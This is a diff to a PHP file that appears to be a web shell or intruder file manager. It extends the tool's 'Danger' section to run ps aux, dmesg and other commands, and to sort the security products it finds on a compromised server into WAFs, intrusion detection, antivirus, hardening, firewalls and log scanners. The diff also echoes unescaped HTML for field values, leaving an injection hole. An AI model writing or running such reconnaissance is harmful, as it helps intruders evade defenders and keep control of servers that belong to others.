@@ -672,40 +672,147 @@ function getServerInfoDetails() {
     $package_managers = array('apt', 'yum', 'apk', 'pacman', 'dnf');
     foreach (array_merge($useful_cmds, $package_managers) as $cmd) { if (command_exists($cmd)) $found_useful[] = $cmd; }
     $info['Useful'] = !empty($found_useful) ? implode(', ', $found_useful) : 'None found';
-    
-    $found_danger = array();
+
+    // --- NEW COMPREHENSIVE SECURITY DETECTION LOGIC ---
+    $danger_detections = array(
+        'WAF' => array(),
+        'HIDS/IPS' => array(),
+        'Antivirus' => array(),
+        'Hardening' => array(),
+        'Firewall' => array(),
+        'Log Scanners' => array()
+    );
+
+    // Helper to add detection safely and avoid duplicates
+    $add_detection = function($category, $name) use (&$danger_detections) {
+        if (!in_array($name, $danger_detections[$category])) {
+            $danger_detections[$category][] = $name;
+        }
+    };
+
+    // PHP Level Detection
+    if (extension_loaded('suhosin')) $add_detection('Hardening', 'Suhosin (PHP Extension)');
+
+    // Server-level checks (mostly Linux)
     if (!$is_windows && is_callable_shell_func('shell_exec')) {
         $ps_output = @shell_exec('ps aux');
         $dmesg_output = @shell_exec('dmesg');
-        
-        $danger_keywords = array(
-            'clamd', 'clamav', 'freshclam', 'avg', 'kav', 'nod32', 'bdcored', 'uvscan', 'sav', 'drwebd', 'sophos',
-            'rkhunter', 'chkrootkit',
-            'ossec', 'wazuh', 'tripwire', 'aide', 'snort', 'suricata', 'bro', 'zeek',
-            'iptables', 'ufw', 'firewalld', 'ipfw', 'shorewall', 'portsentry',
-            'fail2ban', 'denyhosts', 'lidsadm', 'grsecurity', 'pax', 'selinux', 'apparmor',
-            'logwatch', 'logcheck'
-        );
-        foreach ($danger_keywords as $keyword) { if (stripos($ps_output, $keyword) !== false) $found_danger[] = $keyword . ' (process)'; }
-        
-        if (stripos($dmesg_output, 'SELinux') !== false) $found_danger[] = 'SELinux (kernel)';
-        if (stripos($dmesg_output, 'AppArmor') !== false) $found_danger[] = 'AppArmor (kernel)';
-        if (stripos($dmesg_output, 'grsecurity') !== false) $found_danger[] = 'grsecurity (kernel)';
-        
-        if (@is_readable('/etc/rkhunter.conf') || @is_dir('/etc/rkhunter')) $found_danger[] = 'rkhunter (config)';
-        if (@is_readable('/etc/chkrootkit.conf')) $found_danger[] = 'chkrootkit (config)';
-        if (@is_dir('/var/ossec') || @is_dir('/etc/ossec')) $found_danger[] = 'ossec/wazuh (config)';
-        
+
+        // --- Specific Product Detections ---
+
+        // Imunify360 / ImunifyAV
+        if (command_exists('imunify360-agent')) {
+            $add_detection('WAF', 'Imunify360 (Agent)');
+        } elseif (@is_dir('/etc/sysconfig/imunify360') || @is_dir('/var/imunify360')) {
+            $add_detection('WAF', 'Imunify360 (Config)');
+        } elseif (($auto_prepend = @ini_get('auto_prepend_file')) && stripos($auto_prepend, 'imunify360') !== false) {
+            $add_detection('WAF', 'Imunify360 (PHP Hook)');
+        } elseif ($ps_output && preg_match('/imunify(360)?-(agent|service|sentry)/i', $ps_output)) {
+            $add_detection('WAF', 'Imunify360 (Process)');
+        }
+
+        // ModSecurity
+        $modsec_detected = false;
         if (function_exists('apache_get_modules') && in_array('mod_security2', apache_get_modules())) {
-            $found_danger[] = 'mod_security (Apache)';
+            $add_detection('WAF', 'ModSecurity (Apache Module)'); $modsec_detected = true;
         } elseif (command_exists('httpd') && stripos(@shell_exec('httpd -M 2>/dev/null'), 'security2_module') !== false) {
-             $found_danger[] = 'mod_security (Apache)';
+            $add_detection('WAF', 'ModSecurity (Apache Binary)'); $modsec_detected = true;
         } elseif (command_exists('apache2ctl') && stripos(@shell_exec('apache2ctl -M 2>/dev/null'), 'security2_module') !== false) {
-             $found_danger[] = 'mod_security (Apache)';
+            $add_detection('WAF', 'ModSecurity (Apache Binary)'); $modsec_detected = true;
+        } elseif (command_exists('nginx') && stripos(@shell_exec('nginx -V 2>&1'), 'mod_security') !== false) {
+             $add_detection('WAF', 'ModSecurity (Nginx Module)'); $modsec_detected = true;
+        }
+        if (!$modsec_detected && (@is_dir('/etc/modsecurity') || @is_dir('/etc/nginx/modsec'))) {
+             $add_detection('WAF', 'ModSecurity (Config)');
+        }
+
+        // Comodo WAF (CWAF)
+        if (function_exists('apache_get_modules') && in_array('mod_cwaf', apache_get_modules())) {
+            $add_detection('WAF', 'Comodo WAF (Apache Module)');
+        } elseif (@is_dir('/usr/local/cwaf')) {
+            $add_detection('WAF', 'Comodo WAF (Config)');
+        }
+
+        // WordPress WAFs (Wordfence, Sucuri)
+        $find_wp_root = function() {
+            $path = __DIR__;
+            for ($i = 0; $i < 10; $i++) {
+                if (@is_file($path . '/wp-config.php')) return $path;
+                $parent = dirname($path);
+                if ($parent === $path || empty($parent)) break;
+                $path = $parent;
+            }
+            return false;
+        };
+        if (($wp_root = $find_wp_root())) {
+            if (@is_file($wp_root . '/wordfence-waf.php') || @is_dir($wp_root . '/wp-content/plugins/wordfence/')) {
+                $add_detection('WAF', 'Wordfence (WordPress)');
+            }
+            if (@is_dir($wp_root . '/wp-content/plugins/sucuri-scanner/')) {
+                $add_detection('WAF', 'Sucuri (WordPress)');
+            }
+        }
+        
+        // OSSEC / Wazuh
+        if ($ps_output && preg_match('/(ossec|wazuh)-(agentd|maild|execd|logcollector|remoted|syscheckd|monitord)/i', $ps_output)) {
+             $add_detection('HIDS/IPS', preg_match('/wazuh/i', $ps_output) ? 'Wazuh (Process)' : 'OSSEC (Process)');
+        } elseif (@is_readable('/var/ossec/etc/ossec.conf')) {
+             $add_detection('HIDS/IPS', 'OSSEC/Wazuh (Config)');
+        }
+
+        // Maldet (Linux Malware Detect)
+        if (command_exists('maldet')) {
+             $add_detection('Antivirus', 'Maldet (LMD)');
+        } elseif (@is_dir('/usr/local/maldet')) {
+             $add_detection('Antivirus', 'Maldet (LMD Config)');
+        }
+        
+        // ClamAV
+        if ($ps_output && preg_match('/(clamd|clamav|freshclam)/i', $ps_output)) {
+            $add_detection('Antivirus', 'ClamAV (Process)');
+        }
+
+        // Rootkit Hunters
+        if (command_exists('rkhunter') || @is_readable('/etc/rkhunter.conf')) $add_detection('HIDS/IPS', 'RKHunter');
+        if (command_exists('chkrootkit') || @is_readable('/etc/chkrootkit.conf')) $add_detection('HIDS/IPS', 'Chkrootkit');
+
+        // Kernel-level Hardening
+        if ($dmesg_output) {
+            if (stripos($dmesg_output, 'SELinux') !== false) $add_detection('Hardening', 'SELinux (dmesg)');
+            if (stripos($dmesg_output, 'AppArmor') !== false) $add_detection('Hardening', 'AppArmor (dmesg)');
+            if (stripos($dmesg_output, 'grsecurity') !== false) $add_detection('Hardening', 'Grsecurity (dmesg)');
+        }
+        if (!in_array('SELinux (dmesg)', $danger_detections['Hardening']) && command_exists('sestatus') && stripos(@shell_exec('sestatus'), 'enabled') !== false) {
+             $add_detection('Hardening', 'SELinux (sestatus)');
+        }
+        
+        // --- Generic Keyword Scan (Fallback) ---
+        $generic_keywords = [
+            'HIDS/IPS' => ['snort', 'suricata', 'tripwire', 'aide', 'bro', 'zeek'],
+            'Firewall' => ['iptables', 'ufw', 'firewalld', 'ipfw', 'shorewall', 'portsentry'],
+            'Log Scanners' => ['fail2ban', 'denyhosts', 'logwatch', 'logcheck'],
+            'Antivirus' => ['avg', 'kav', 'nod32', 'bdcored', 'uvscan', 'sav', 'drwebd', 'sophos']
+        ];
+        if($ps_output){
+            foreach($generic_keywords as $category => $keywords){
+                foreach($keywords as $keyword){
+                    if (stripos($ps_output, $keyword) !== false) {
+                        $add_detection($category, ucfirst($keyword) . ' (Process)');
+                    }
+                }
+            }
         }
     }
-    if (extension_loaded('suhosin')) $found_danger[] = 'suhosin (PHP)';
-    $info['Danger'] = !empty($found_danger) ? implode(', ', array_unique($found_danger)) : 'None detected';
+    
+    // Assemble the final string
+    $danger_strings = [];
+    foreach($danger_detections as $category => $items) {
+        if (!empty($items)) {
+            $danger_strings[] = "<strong>" . htmlspecialchars($category) . ":</strong> " . htmlspecialchars(implode(', ', array_unique($items)));
+        }
+    }
+    
+    $info['Danger'] = !empty($danger_strings) ? implode('<br>', $danger_strings) : 'None detected';
 
     $safe_mode_val = ini_get('safe_mode');
     if(is_string($safe_mode_val) && strtolower($safe_mode_val) === "off") $safe_mode_val = 0;
@@ -1698,6 +1805,7 @@ endif;
         .file-table td i.fa-solid, .file-table td i.fa-brands { margin-right: 8px; width: 20px; text-align: center; }
         .info-table { width: 100%; border-collapse: collapse; } .info-table td { padding: 8px; border: 1px solid #055; vertical-align: top; word-break: break-all;}
         .info-table td:first-child { font-weight: bold; color: #0cc; width: 30%; background: #010101; }
+        .info-table td strong { font-weight:bold; color:#0ee; } /* For Danger field categories */
         .info-table td span { color:lime; } .info-table td span[style*="color:red"] { color:red !important; } .info-table td span[style*="color:orange"] { color:orange !important; }
         .info-table pre, #about-content pre { background-color: #000; color: #0f0; padding: 10px; border: 1px solid #033; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word; max-height: 300px; font-size:0.9em; border-radius: 3px; }
         #about-content h2, #about-content h3 { color: #0ff; border-bottom: 1px solid #055; padding-bottom: 5px; margin-top: 15px; }
@@ -1859,12 +1967,19 @@ endif;
             <table class="info-table"><?php
                 $server_details = getServerInfoDetails();
                 foreach ($server_details as $k => $v) {
-                    $value_display = (is_string($v) && (strpos($v, '<span style="color:red;">') !== false || strpos($v, '<span style="color:orange;">') !== false || strpos($v, '<span style="color:lime;">') !== false || strpos($v, '<a href') !== false)) ? $v : htmlspecialchars($v);
-                    echo "<tr><td>" . htmlspecialchars($k) . "</td><td>" .
-                         (($k === 'Network Interfaces (attempt)' || $k === 'Disabled Functions' || $k === 'Open Basedir' || $k === 'Include Path' || $k === 'Session Save Path' || $k === 'Downloaders' || $k === 'Useful' || $k === 'Danger')
-                            ? "<pre>" . htmlspecialchars($v) . "</pre>"
-                            : $value_display) .
-                         "</td></tr>";
+                    echo "<tr><td>" . htmlspecialchars($k) . "</td><td>";
+                    if ($k === 'Danger') {
+                        // The 'Danger' field now contains its own HTML formatting
+                        echo $v;
+                    } elseif (in_array($k, ['Network Interfaces (attempt)', 'Disabled Functions', 'Open Basedir', 'Include Path', 'Session Save Path', 'Downloaders', 'Useful'])) {
+                        // These fields are best displayed in a <pre> block
+                        echo "<pre>" . htmlspecialchars($v) . "</pre>";
+                    } else {
+                        // Default behavior: allow HTML for specific spans, otherwise escape
+                        $value_display = (is_string($v) && strpos($v, '<') !== false) ? $v : htmlspecialchars($v);
+                        echo $value_display;
+                    }
+                    echo "</td></tr>";
                 }
             ?></table>
         </div>
